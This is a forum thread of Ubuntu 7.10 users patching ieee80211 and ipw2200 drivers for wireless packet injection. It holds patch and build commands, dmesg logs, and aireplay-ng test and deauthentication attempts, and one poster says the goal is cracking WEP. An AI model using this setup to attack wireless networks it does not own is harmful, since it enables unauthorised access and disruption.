For those still looking for a solution: just download the newest versions of the ieee en ipw drivers (1.2.1 and 1.2.2) from above mentioned sites, then download the attached patch. Follow the guide on the first page (ofcourse, chaning version numbers where applicable) and you should do just fine using gutsy (ubuntu 7.10, kernel 2.6.22).

However, a first testrun seems to point out that injection still doesn't work. More on this later!

---

### Post by cleonII on 2007-12-27
Ive managed to get it working on Ubuntu  (or Kubuntu) 7.10 (SOLVE THE  "struct sk_buff" problem):
you have to follow all the steps mentioned by the creator of this thread **except**:
download ieee version 1.2.18 instead of 1.2.17
download ieee version 1.2.2 instead of 1.2.1
download the attached file of this post.
uncompress all on the same folder.
ignore the patch steps of the howto. (instead use the following ones)
execute: 
patch -p0 < ieee80211_inject-1.2.18.patch
patch -p0 < ipw2200-1.2.2-inject.patch
patch -p0 < ipw2200-1.2.2-make.patch
finally instead of execute the remove_old , make and make install on the folders mentioned on the original howto, execute them in the folders of the new version drivers (ieee80211-1.2.18 and ipw2200-1.2.2).
hope this helps.
Regards.

Max

---

### Post by BlackRabbit_BE on 2007-12-27
Kinda what I said ;)

However: can you actually inject with these drivers?

---

### Post by adi82 on 2008-01-26
the newer version worked in my UBUNTU 7.10 ,(hoping to cr*ck some WEP now)
-------------------+thank-------from adi82-------------

> adi@adi:~$ dmesg | grep ieee
[   11.888000] ieee80211_crypt: registered algorithm 'NULL'
[   11.940000] ieee80211: 802.11 data/management/control stack, 1.2.18
[   11.940000] ieee80211: Copyright (C) 2004-2005 Intel Corporation <jketreno@linux.intel.com>
adi@adi:~$ dmesg | grep ipw
[   12.100000] ipw2200: Intel(R) PRO/Wireless 2200/2915 Network Driver, 1.2.2dmprq
[   12.100000] ipw2200: Copyright(c) 2003-2006 Intel Corporation
[   12.100000] ipw2200: Detected Intel PRO/Wireless 2200BG Network Connection
[   12.336000] ipw2200: Detected geography ZZR (14 802.11bg channels, 0 802.11a channels)


---

### Post by brienc on 2008-02-14
> **cleonII said:**
> Ive managed to get it working on Ubuntu  (or Kubuntu) 7.10 (SOLVE THE  "struct sk_buff" problem):
you have to follow all the steps mentioned by the creator of this thread **except**:
download ieee version 1.2.18 instead of 1.2.17
download ieee version 1.2.2 instead of 1.2.1
download the attached file of this post.
uncompress all on the same folder.
ignore the patch steps of the howto. (instead use the following ones)
execute: 
patch -p0 < ieee80211_inject-1.2.18.patch
patch -p0 < ipw2200-1.2.2-inject.patch
patch -p0 < ipw2200-1.2.2-make.patch
finally instead of execute the remove_old , make and make install on the folders mentioned on the original howto, execute them in the folders of the new version drivers (ieee80211-1.2.18 and ipw2200-1.2.2).
hope this helps.
Regards.

Max

Thanks, I have the struct sk_buff issue (so no wireless card).  I'm going to try this fix tonight!

---

### Post by cosine352 on 2008-02-23
Hi all,
I have a problem. When I execute the code

dmesg | grep ipw

it gives no out put. 


Any help?

Thanks

---

### Post by cosine352 on 2008-02-28
please help.

I am not able to patch
> :~/patch$ patch -p0 < ipw2200-1.2.2-inject.patch
patching file ipw2200-1.2.2/ipw2200.c
Hunk #1 succeeded at 3037 with fuzz 2 (offset 1066 lines).
Hunk #2 FAILED at 12814.
1 out of 2 hunks FAILED -- saving rejects to file ipw2200-1.2.2/ipw2200.c.rej
:~/patch$ 


I am using Ubuntu 7.10 
any help please??????????

---

### Post by eleanor on 2008-03-10
I install the last drivers!

```
$ dmesg | grep ipw
[  144.655887] ipw2200: Intel(R) PRO/Wireless 2200/2915 Network Driver, 1.2.2dmprq
[  144.655897] ipw2200: Copyright(c) 2003-2006 Intel Corporation
[  144.750419] ipw2200: Detected Intel PRO/Wireless 2200BG Network Connection
[  147.475645] ipw2200: Detected geography ZZR (14 802.11bg channels, 0 802.11a channels)
[  287.888000] ipw2200: Intel(R) PRO/Wireless 2200/2915 Network Driver, 1.2.2dmprq
[  287.888000] ipw2200: Copyright(c) 2003-2006 Intel Corporation
[  287.888000] ipw2200: Detected Intel PRO/Wireless 2200BG Network Connection
[  288.016000] ipw2200: Detected geography ZZR (14 802.11bg channels, 0 802.11a channels
```

and

```
$ dmesg | grep iee
[   38.510246] ieee1394: Host added: ID:BUS[0-00:1023]  GUID[00023f444a006287]
[  144.400681] ieee80211_crypt: registered algorithm 'NULL'
[  144.453320] ieee80211: 802.11 data/management/control stack, 1.2.18
[  144.453330] ieee80211: Copyright (C) 2004-2005 Intel Corporation <jketreno@linux.intel.com>
[  208.312000] ieee80211_crypt: registered algorithm 'TKIP'

```

if i do the test command then i get this
```
$ sudo aireplay-ng --test eth1
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
read failed: Bad file descriptor
21:30:00  No Answer...
21:30:00  Found 0 APs

```
 and on the rtap0
```
$ sudo aireplay-ng --test rtap0
21:30:58  Trying broadcast probe requests...
21:30:59  No Answer...
21:30:59  Found 2 APs

21:30:59  Trying directed probe requests...
21:30:59  00:04:E2:D4:C8:** - channel: 6 - 'SMC'
21:31:08  0/30: 0%

21:31:08  00:4F:61:00:6D:** - channel: 6 - '*****ink.nl'
21:31:17  0/30: 0%

```

and if i try 
```
$ sudo aireplay-ng -0 1 eth1
IPW2200-sysfs does not support non-data injection, so attack 0 is not supported

```

if i use the rtap0 then its trying but no result
can someone help me

---

### Post by gamecerenimo on 2008-06-21
hi, thanks for making this guide. I wonder if someone can help me out with a problem I have when trying to complete this..

when attempting to complie things I get the following message:

andy@andy-laptop:/newipw/ieee80211-1.2.17$ sudo sh remove-old
Checking in /lib/modules/2.6.20-16-generic for ieee80211 components...
andy@andy-laptop:/newipw/ieee80211-1.2.17$ sudo make
Makefile:17:
Makefile:18: WARNING: $SHELL not set to bash.
Makefile:19: If you experience build errors, try
Makefile:20: 'make SHELL=/bin/bash'.
Makefile:21:
Checking in /lib/modules/2.6.20-16-generic for ieee80211 components...
make -C /lib/modules/2.6.20-16-generic/build M=/newipw/ieee80211-1.2.17 modules
make[1]: Entering directory `/usr/src/linux-headers-2.6.20-16-generic'
Makefile:499: /usr/src/linux-headers-2.6.20-16-generic/arch/i386/Makefile: No such file or directory
make[1]: *** No rule to make target `/usr/src/linux-headers-2.6.20-16-generic/arch/i386/Makefile'. Stop.
make[1]: Leaving directory `/usr/src/linux-headers-2.6.20-16-generic'
make: *** [modules] Error 2

---

